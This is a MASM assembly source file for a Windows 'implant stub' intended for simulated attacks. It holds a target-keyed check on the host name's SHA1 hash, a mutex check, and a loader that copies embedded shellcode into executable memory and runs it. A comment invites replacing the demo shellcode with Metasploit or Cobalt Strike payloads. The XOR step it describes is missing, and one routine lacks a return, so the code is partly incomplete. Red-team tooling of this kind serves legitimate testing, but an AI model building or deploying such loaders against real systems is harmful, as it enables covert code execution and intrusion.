; -----------------------------------------------------------------------------
; 
;  Implant Stub Code - MASM EXE
;  (C) Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
;
;  This code is designed to act as a basis for safer implants during simulated
;  attacks. 
;
;  Compile this by running 'makeit.bat' from the same drive as a masm32 installation.
; 
; -----------------------------------------------------------------------------

.586
.model flat,stdcall
option casemap:none

; -----------------------------------------------------------------------------
;  These includes are needed for the compiler and linker
; -----------------------------------------------------------------------------

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\advapi32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib           
includelib \masm32\lib\advapi32.lib           

; -----------------------------------------------------------------------------
;  MASM works by single-pass, so all functions need to be declared
;  in advance so that the lexcial analyser will work properly
; -----------------------------------------------------------------------------

CheckExecution PROTO 
MutexCheck PROTO
ExecuteShellcode PROTO
GetComputerInfo PROTO :DWORD
GenerateHash PROTO :DWORD,:DWORD

.data         
                     
; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
strMutexName  db  "Global\Stufus",0    

; The hash of the authorised NetBIOS computer name
hashSHA1CompterName db 53h,8Fh,68h,0F9h,2Ch,0A3h,76h,0E5h,23h,0E6h,0D6h,0A9h,68h,63h,0DEh,02h,7Dh,76h,0A3h,0DAh

; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
; and some experimentation
CNF_ComputerNamePhysicalNetBIOS           equ 4
CNF_ComputerNamePhysicalDnsHostname       equ 5
CNF_ComputerNamePhysicalDnsDomain         equ 6
CNF_ComputerNamePhysicalDnsFullyQualified equ 7

; From https://msdn.microsoft.com/en-us/library/windows/desktop/aa375549%28v=vs.85%29.aspx
MS_CALG_SHA1 equ 8004h    
MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)

; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
SHELLCODELEN equ 303
shellcode db 217,235,155,217,116,36,244,49,210,178,119,49,201,100,139,113,48,139,118,12
          db 139,118,28,139,70,8,139,126,32,139,54,56,79,24,117,243,89,1,209,255
          db 225,96,139,108,36,36,139,69,60,139,84,40,120,1,234,139,74,24,139,90
          db 32,1,235,227,52,73,139,52,139,1,238,49,255,49,192,252,172,132,192,116
          db 7,193,207,13,1,199,235,244,59,124,36,40,117,225,139,90,36,1,235,102
          db 139,12,75,139,90,28,1,235,139,4,139,1,232,137,68,36,28,97,195,178
          db 8,41,212,137,229,137,194,104,142,78,14,236,82,232,159,255,255,255,137,69
          db 4,187,126,216,226,115,135,28,36,82,232,142,255,255,255,137,69,8,104,108
          db 108,32,65,104,51,50,46,100,104,117,115,101,114,48,219,136,92,36,10,137
          db 230,86,255,85,4,137,194,80,187,168,162,77,188,135,28,36,82,232,95,255
          db 255,255,104,115,88,32,32,104,32,76,97,98,104,32,77,87,82,104,117,115
          db 32,47,104,83,116,117,102,49,219,136,92,36,17,137,227,104,88,32,32,32
          db 104,32,110,111,119,104,110,105,110,103,104,32,114,117,110,104,100,32,98,101
          db 104,119,111,117,108,104,97,110,116,32,104,105,109,112,108,104,84,104,101,32
          db 49,201,136,76,36,32,137,225,49,210,106,64,83,81,82,255,208,49,192,80
          db 255,85,8

.data?
            
.code 
stufus:

; -----------------------------------------------------------------------------
;  Entry point
; -----------------------------------------------------------------------------
 
invoke CheckExecution       ; This does the main work
invoke ExitProcess, NULL    ; Exit cleanly when the time comes



; -----------------------------------------------------------------------------
; 
;  CheckExecution
;  This function does all of the work; it will go through the relevant checks
;  and execute the shellcode if they all pass.
; 
; -----------------------------------------------------------------------------

CheckExecution PROC uses esi edi

 ; ============================================================================
 ; 
 ; CHECK 1: NETBIOS NAME vs STORED HASH
 ;
 ; ============================================================================

 ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
 invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
 mov esi, eax           ; Contains the raw computer name
 invoke lstrlen, esi    
 mov ecx, eax           ; Contains the length of the raw computer name
 invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the computer name
 mov edi, eax           ; Contains the hash of the raw computer name
 invoke GlobalFree, esi ; Free the NETBIOS name buffer

 ; Now compare the hash of the name of the host against the stored hash
 push edi               ; Store a pointer to the raw computer name hash so we can clear it later
 mov ecx, MS_CALG_SHA1_HASHSIZE ; ecx = length of the hash
 cld                            ; Clear the direction flag (i.e. left-to-right comparison)
 mov esi, offset hashSHA1CompterName ; The calculated hash is in edi, the stored hash is now in esi
 repz cmpsb                     ; Compare [esi] and [edi] up to 'ecx' times :-)
 jnz badhash                    ; If they are different, the hash was incorrect



 ; ============================================================================
 ; 
 ; CHECK 2: MUTEX
 ;
 ; ============================================================================

 ; Check to see whether the implant is already running or not
 invoke MutexCheck   ; Perform the mutex check
 test eax, eax       ; If return value is 0, don't continue
 jz done



 ; ============================================================================
 ; 
 ; CHECK 3: XORing shellcode against hash of domain name
 ;
 ; ============================================================================

 ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
 invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
 mov esi, eax           ; Contains the raw computer name
 invoke lstrlen, esi    
 mov ecx, eax           ; Contains the length of the FQDN
 invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the FQDN
 mov edi, eax           ; Contains the hash of the FQDN
 invoke GlobalFree, esi ; Free the buffer

 ; Now loop through the shellcode xoring it with the hash values (repeating hash
 ; values if necessary)
 ; ecx = The loop counter


 invoke GlobalFree, edi ; Free the hash buffer

 ; Now run the shellcode
 invoke ExecuteShellcode

; If the hash was incorrect, jump here because we
; need to free the generated hash memory
badhash:
 pop edi
 invoke GlobalFree, edi

done:
 ret
    
CheckExecution ENDP



; -----------------------------------------------------------------------------
; 
;  GetComputerInfo
;  This function retrieves information about the computer (e.g. its name)
;  and returns a buffer to it. Caller needs to free it when done.
; 
; -----------------------------------------------------------------------------

GetComputerInfo PROC uses esi reqinfo:DWORD
LOCAL lsize:DWORD

    mov lsize, 0
    invoke GetComputerNameEx, reqinfo, NULL, addr lsize ; Find out how large this string actually is
    inc lsize
    invoke GlobalAlloc, GPTR, lsize                     ; Allocate the memory needed to store the name
    test eax, eax                                       ; Make sure the function worked
    jz done
    mov esi, eax
    invoke GetComputerNameEx, reqinfo, esi, addr lsize  ; Actually retrieve it
    test eax, eax
    jz done
    mov eax, esi 
done:
    ret
GetComputerInfo ENDP



; -----------------------------------------------------------------------------
; 
;  MutexCheck
;  This function attempts to create the mutex stored in 'strMutexName'. It will
;  return 0 in eax if the mutex already existed and return -1 if it did not.
;
;  0 = Don't go any further, its already running.
;  1 = Continue execution.
; 
; -----------------------------------------------------------------------------

MutexCheck PROC 
 invoke CreateMutex, NULL, TRUE, addr strMutexName
 .if eax==NULL
      xor eax, eax
      ret
 .else
      invoke GetLastError
      .if eax==ERROR_ALREADY_EXISTS
          xor eax, eax
          ret
      .else
          mov eax, -1
          ret
      .endif
 .endif
MutexCheck ENDP



; Generate hash using CryptoAPI
GenerateHash PROC uses esi ptrString:DWORD,stringlength:DWORD
LOCAL hProv:DWORD
LOCAL hHash:DWORD
LOCAL dwHashSize:DWORD
LOCAL dwHashSizeLen:DWORD

 mov dwHashSizeLen, 4 ; 32-bit :)
 invoke CryptAcquireContext, addr hProv, NULL, NULL, PROV_RSA_AES, NULL
 .if eax!=NULL
   invoke CryptCreateHash, hProv, MS_CALG_SHA1, NULL, NULL, addr hHash
   .if eax!=NULL
     invoke CryptHashData,hHash, ptrString, stringlength, NULL
     .if eax!=NULL
       invoke CryptGetHashParam, hHash, HP_HASHSIZE, addr dwHashSize, addr dwHashSizeLen, NULL
       .if eax!= NULL
         invoke GlobalAlloc, GPTR, dwHashSize
         .if eax!=NULL
           mov esi, eax
           invoke CryptGetHashParam, hHash, HP_HASHVAL, esi, addr dwHashSize, NULL
           .if (eax!=NULL && dwHashSize==MS_CALG_SHA1_HASHSIZE)
             mov eax, esi  ; Hash is now stored in esi
           .endif
         .endif
       .endif 
     .endif
     push eax
     invoke CryptDestroyHash, hHash
     pop eax
   .endif
   push eax
   invoke CryptReleaseContext, hProv, NULL
   pop eax
 .endif
 ret
GenerateHash ENDP



; -----------------------------------------------------------------------------
; 
;  ExecuteShellcode
;  This function will execute the shellcode provided
; 
; -----------------------------------------------------------------------------

ExecuteShellcode PROC uses esi edi
  ; Allocate the memory for the shellcode
  invoke VirtualAlloc, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE
  .if eax!=0
    mov edi, eax
    push eax
    mov esi, offset shellcode
    mov ecx, SHELLCODELEN
    cld
    rep movsb
    pop edx
    call edx ; The shellcode should take over from here
  .endif
ExecuteShellcode ENDP

End stufus
